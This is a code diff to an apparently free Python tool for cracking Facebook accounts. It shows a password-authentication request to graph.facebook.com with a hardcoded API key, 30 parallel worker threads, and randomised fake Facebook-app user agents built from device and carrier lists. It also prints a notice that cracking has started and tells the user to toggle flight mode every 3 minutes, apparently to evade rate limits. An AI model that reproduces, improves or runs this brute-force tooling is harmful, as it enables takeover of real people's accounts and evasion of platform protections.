@@ -73,7 +73,7 @@ def logo():
  \033[1;36m[•] Status    :   Free
  \033[1;36m[•] Tool      :   Free 
  \033[1;36m[•] Facebook  :   RIZEL GALLARDO
- \033[1;36m[•] Version   :   3.0
+ \033[1;36m[•] Version   :   3.1
 
 ╰────────────────────────────────────────────────────╯''')
 
@@ -338,7 +338,7 @@ class Ishmum:
 			pwx.append(input(" [•] Put Password %s : "%(n+1)))
 		logo()		
 		p(" [•] Total Accounts : %s "%(str(len(id))))
-		p(" [•] Use Flight Mode After Every 3 Minutes") 
+		p(" [•] Use Flight Mode Every 3 Minutes") 
 		p(" [•] Cracking Has Been Started ")
 		line()
 		with tpe(max_workers=30) as saqi:
@@ -412,7 +412,7 @@ class Ishmum:
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-				headers = {'User-Agent':ishmum_ua,
+				headers = {'User-Agent':iAmMethod1Ua(),
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': '45201',
@@ -567,7 +567,7 @@ class Ishmum:
 			width = random.randint(720, 1440)
 			height = random.randint(1080, 2560)
 			fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","tl-PH","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
-			fbcr = random.choice(["PLDT","Smart Communications","Globe Telecom","SMART","Globe","Smart-PH","Globe-PH","DITO Telecommunity","PLDT-PH","Sky","ABS-CBN","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
+			fbcr = random.choice(["PLDT","Smart Communications","Globe Telecom","SMART","Globe","Smart-PH","Globe-PH","DITO Telecommunity","PLDT-PH","Sky","ABS-CBN"])
 			fban = random.choice(["FB4A", "FB5A", "FB6A"])
 			fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
 			ishmum_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/LGE;FBBD/lge;FBDV/LG-H901;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
